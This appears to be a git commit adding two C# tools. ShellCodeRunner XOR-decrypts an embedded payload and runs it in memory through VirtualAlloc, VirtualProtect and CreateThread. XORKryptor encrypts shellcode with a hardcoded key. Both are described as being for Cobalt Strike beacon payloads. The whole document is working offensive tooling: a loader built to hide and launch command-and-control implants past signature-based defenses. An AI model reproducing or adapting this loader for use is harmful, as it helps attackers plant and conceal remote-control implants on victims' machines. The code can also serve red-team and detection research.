81ddc481110ffad4c4be8b038f046476513ae61a
Antonio Piazza <antman1p@gmail.com>
2019-04-22 18:02:32 -0400

    Add project files.

---
+++ ShellCodeRunner/Program.cs
@@ -0,0 +1,148 @@
+﻿/*
+ * ShellCodeRunner
+ * A .NET ShellCode runner wiht built in XOR DECRYPTOR, intended for running XOR encrypted  
+ * Cobalt strike beacon payloads, but can be used for any XOR encrypted payload.
+ * 
+ * By Antonio Piazza
+ * 4n7m4n
+ * Twitter: @antman1p
+ * 
+ * Held by the hand/taught/mentored/instructed and written by Dwight Hohnstein
+ * Twitter: @djhohnstein
+ * 
+ */
+
+using System;
+using System.Runtime.InteropServices;
+
+namespace ShellCodeRunner
+{
+    class Program
+    {
+        static byte[] GetAllDecryptedBytes()
+        {
+            //Encryption Key
+            char[] key = { 'p', 'a', 's', 's', 'k', 'e', 'y' };
+
+            // Get the encrypted payload from the embedded resource
+            byte[] encBytes = ShellCodeRunner.Properties.Resources.encrypt;
+
+            // New byte array to hold decrypet payload bytes
+            byte[] newByte = new byte[encBytes.Length];
+
+            // index for the encryption key
+            int j = 0;
+
+            // Loop through each byte of the encrypted payload
+            for (int i = 0; i < encBytes.Length; i++)
+            {
+                // iterate through the bytes of the encryption key.  If at the end of the array, loop back to the begining 
+                if (j == key.Length)
+                {
+                    j = 0;
+                }
+                // XOR each byte of the encrypted payload with the coresponding byte of the encryption key
+                newByte[i] = (byte)(encBytes[i] ^ Convert.ToByte(key[j]));
+                j++;
+            }
+            return newByte;
+        }
+
+        static void Main(string[] args)
+        {
+            // Get decrypted pic
+            byte[] pic = GetAllDecryptedBytes();
+            
+            // Allocate space for it
+            IntPtr segment = VirtualAlloc(
+                IntPtr.Zero,
+                // Length of the decrypted payload
+                (uint)pic.Length,
+                AllocationType.Commit,
+                //Allocate as RW
+                MemoryProtection.ReadWrite);
+
+            // Copy over pic to segment
+            Marshal.Copy(pic, 0, segment, pic.Length);
+
+            // Reprotect segment to make it executable
+            MemoryProtection oldProtect = new MemoryProtection();
+            bool rxSuccess = VirtualProtect(segment, (uint)pic.Length, MemoryProtection.ExecuteRead, out oldProtect);
+
+            // Prepare variables for CreateThread
+            IntPtr threadId = IntPtr.Zero;
+            SECURITY_ATTRIBUTES attrs = new SECURITY_ATTRIBUTES();
+            // Create the thread
+            IntPtr hThread = CreateThread(attrs, 0, segment, IntPtr.Zero, CreationFlags.IMMEDIATE, out threadId);
+            // Wait for its execution to finish, which is until beacon calls exit.
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress,
+            uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtect(IntPtr lpAddress,
+            uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private unsafe static extern IntPtr CreateThread(
+        SECURITY_ATTRIBUTES lpThreadAttributes,
+        int dwStackSize,
+        IntPtr lpStartAddress,
+        IntPtr lpParameter,
+        CreationFlags dwCreationFlags,
+        out IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public unsafe byte* lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+
+        [Flags]
+        public enum CreationFlags
+        {
+            IMMEDIATE = 0,
+            CREATE_SUSPENDED = 0x00000004,
+            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
+        }
+    }
+}
---
+++ XORKryptor/Program.cs
@@ -0,0 +1,78 @@
+﻿/*
+ * XORKryptor
+ * A .NET XOR encryption tool, intended to encrypt Cobalt strike beacon payloads,
+ * but can be used on any file.
+ * 
+ * By Antonio Piazza
+ * 4n7m4n
+ * Twitter: @antman1p
+ * 
+ * Held by the hand and taught/mentored/instructed by Dwight Hohnstein
+ * Twitter: @djhohnstein
+ * 
+ */
+
+using System;
+using System.IO;
+
+namespace ShellCodeRunner
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length != 1)
+            {
+                Console.WriteLine("ERROR: Pass only the path to the shell code file to encrypt");
+                Environment.Exit(1);
+            }
+            if (!File.Exists(args[0]))
+            {
+                Console.WriteLine("Could not find the shellcode bin file: {0}", args[0]);
+                Environment.Exit(1);
+            }
+            // Call function wiht command line argument which is the unencrypted beacon payload path if arguments pass checks
+            getPayLoad(args[0]);
+        }
+
+        static void getPayLoad(string bcnPath)
+        {
+            // Read the bytes from the unencrypted beacon payload file to a byte array
+            byte[] uncShell = File.ReadAllBytes(bcnPath);
+
+            // Encryption key.  Change this to whatever you want
+            char[] arryKey = { 'p', 'a', 's', 's', 'k', 'e', 'y' };
+
+            // Call the XOR encryption function on the payload with the encryption key
+            byte [] payLoad = encrypt(uncShell, arryKey);
+
+            // Write the encrypted payload out to a file
+            File.WriteAllBytes("encrypt.bin", payLoad);
+            Console.WriteLine("Shellcode has been encrypted.");
+        }
+
+        static byte[] encrypt(byte[] shellCode, char[] key)
+        {
+            // Initialize a new byte array the size of the unencrypted shellcode
+            byte[] newByte = new byte[shellCode.Length];
+
+            // Encryption key index
+            int j = 0;
+
+            // iterate through each byte of the unecncrypted shellcode
+            for (int i = 0; i < shellCode.Length; i++)
+            {
+                // iterate through the bytes of the encryption key.  If at the end of the array, loop back to the begining 
+                if (j == key.Length)
+                {
+                    j = 0;
+                }
+
+                // XOR each byte of the unencrypted payload with the coresponding byte of the encryption key
+                newByte[i] = (byte)(shellCode[i] ^ Convert.ToByte(key[j]));
+                j++;
+            }
+            return newByte;
+        }
+    }
+}
